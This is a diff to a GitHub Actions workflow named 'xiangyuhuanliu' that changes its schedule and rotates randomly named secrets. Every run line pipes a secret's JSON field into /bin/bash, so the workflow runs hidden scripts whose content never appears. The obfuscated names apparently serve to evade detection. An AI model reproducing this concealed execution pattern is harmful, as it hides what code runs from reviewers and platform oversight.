@@ -3,25 +3,23 @@ name: xiangyuhuanliu
 on:
   workflow_dispatch:
   schedule:
-    - cron: '55 4/6 * * *'
+    - cron: '53 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: xiangyuhuanliu
         env:
-          nc4: ${{ secrets.nc4 }}
+          gvpln31: ${{ secrets.gvpln31 }}
         run: |
-          echo $nc4 | jq -r .qmfe3119 | /bin/bash
-          echo $knu89639 | jq -r .yn865 | /bin/bash
-          echo $smjt05 | jq -r .deks146 | /bin/bash
-          echo $alb516 | jq -r .w76 | /bin/bash
-          echo $k6664 | jq -r .tioxn372 | /bin/bash
-          echo $sq8632 | jq -r .zytvn3 | /bin/bash
-          echo $opwi3 | jq -r .f38676 | /bin/bash
-          echo $m762 | jq -r .ys34 | /bin/bash
-          echo $rzueq2736 | jq -r .xvqft211 | /bin/bash
-          echo $lyiyw60885 | jq -r .tw4212 | /bin/bash
+          echo $gvpln31 | jq -r .aaw86133 | /bin/bash
+          echo $sd734 | jq -r .pp464 | /bin/bash
+          echo $ylw66 | jq -r .k6 | /bin/bash
+          echo $l884 | jq -r .kjd501 | /bin/bash
+          echo $bjyts81813 | jq -r .gaceh00 | /bin/bash
+          echo $hky23 | jq -r .dmys3028 | /bin/bash
+          echo $euj90 | jq -r .eu6993 | /bin/bash
+          echo $q7 | jq -r .gakx6 | /bin/bash
+          echo $a3 | jq -r .qssjz1 | /bin/bash
 
